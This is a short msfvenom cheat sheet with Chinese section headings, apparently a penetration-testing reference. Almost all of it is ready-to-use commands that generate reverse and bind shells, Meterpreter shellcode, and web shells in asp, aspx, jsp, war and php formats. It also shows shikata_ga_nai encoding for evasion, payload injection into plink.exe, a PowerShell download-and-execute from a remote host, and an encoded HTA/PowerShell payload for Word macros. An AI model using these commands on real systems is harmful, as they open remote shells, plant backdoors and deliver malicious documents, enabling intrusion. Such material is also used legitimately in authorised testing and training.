## 参数
```bash
-l, --list <type> 列出指定类型的所有模块 类型包括: payloads, encoders, nops, platforms, archs, formats, all
-e = Encoder type (For Windows, shikata_ga_nai is usually used)
-i = Encoding iterations for obfuscation
-x = Inject payload into an executablemsfvenom -p ...-x /usr/share/windows-resources/binaries/plink.exe

msfvenom -l payloads --> List available payloads
msfvenom -p PAYLOAD --list-options --> List payload options
```



## windows

```bash
msfvenom -p windows/shell_bind_tcp RHOST=0.0.0.0 LPORT=9901 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows > reverse_tcp.c
msfvenom -p windows/shell_reverse_tcp LHOST=0.0.0.0 LPORT=9900 -f exe > ms17–010.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=192.168.119.127 LPORT=9901
msfvenom -p windows/meterpreter/reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=192.168.119.127 LPORT=9902

msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell -c iex(new-object net.webclient).downloadstring('http://10.0.0.1/Invoke-PowerShellTcp-8082.ps1')" -e x86/unicode_mixed -b '\x......' BufferRegister=EAX -f python > shellcode

msfvenom -p cmd/windows/reverse_powershell lhost=0.0.0.0 lport=4445 > rshell.bat

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=80 -e x86/shikata_ga_nai -i 7 -f raw > met.bin
```



## linux

```bash
msfvenom -p linux/x86/shell_reverse_tcp  LHOST=0.0.0.0 LPORT=80 -f elf > shell.elf
```



## asp

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp
```



## aspx

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f asp -e x86/shikata_ga_nai -o shell.asp
msfvenom -f aspx -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -o shell.aspx
```



## jsp

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=0.0.0.0 LPORT=9900 -f raw -o shell.jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=0.0.0.0 LPORT=9900 -f war -o shell.war
```



## javascript

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f js_le > payload.js
```



## php

```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=0.0.0.0 LPORT=9900 -f raw -o shell.php
msfvenom -p php/reverse_php LHOST=0.0.0.0 LPORT=9900 -o shell.php
```



## Word 宏

```bash
msfvenom -e base64 -p windows/shell_reverse_tcp LHOST=0.0.0.0 LPORT=9902 -f hta-psh -o evil.hta

import textwrap
s = "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQA......"
print(textwrap.fill(s, 40))

Word/Excel 2003: Tools -> Macros -> Visual Basic Editor
Word/Excel 2007: View Macros -> then place a name like "moo" and select "create".
```
